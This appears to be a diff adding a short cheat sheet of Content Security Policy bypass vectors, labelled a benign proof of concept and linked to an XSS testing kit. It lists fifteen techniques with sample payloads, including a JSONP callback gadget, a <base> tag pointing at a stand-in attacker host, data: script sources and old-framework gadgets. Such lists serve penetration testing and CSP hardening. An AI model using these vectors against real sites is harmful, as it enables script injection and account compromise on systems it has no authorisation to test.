@@ -1,0 +1,27 @@
+# ============================================================================
+# Safe PoC -> x8bitranjit
+# CSP bypass vector list (XSS-018 companion). Benign payloads only.
+# ============================================================================
+
+# 1) allowlisted JSONP endpoint -> script gadget
+<script src="https://allowed.cdn/api/jsonp?callback=alert">// + callback param
+# 2) <base> hijack when relative scripts + no base-uri directive
+<base href="https://attacker.example.invalid/">
+# 3) strict-dynamic + allowlisted OLD library -> gadget (AngularJS ng-include,
+#    old jQuery $().html, require.js loader)
+<script src="https://allowed.cdn/angular-1.2.js"></script> + ng-include gadget
+# 4) nonce reuse: same nonce on multiple pages / leaked in source map / var
+# 5) script-src with wildcard or missing object-src -> <object data=...>
+# 6) 'unsafe-eval' allowed -> eval/Function gadgets, JS frameworks' eval paths
+# 7) report-only mode: header present but Report-Only = ZERO enforcement
+# 8) data:/ blob: allowed in script-src -> <script src="data:,alert(1)">
+# 9) open redirect on allowlisted origin -> script src follows to attacker
+# 10) allowed path traversal: script-src allowed.cdn/js -> allowed.cdn/js/../jsonp
+# 11) 'strict-dynamic' + preload/prefetch pollution via cache (WCACHE kit)
+# 12) frame-src/child-src missing -> <iframe srcdoc> nested context tricks
+# 13) missing object-src + legacy flash/plugin paths (older stacks)
+# 14) eval-shape bypass via allowed CDN's exposed Angular/Vue template APIs
+# 15) importScripts from service worker scope (sw allowed + attacker SW)
+
+# validation: csp-evaluator.withgoogle.com + live header capture
+# kit cross-ref: XSS-018, XSS-013 (sanitizer), WAFBypass CSP rows
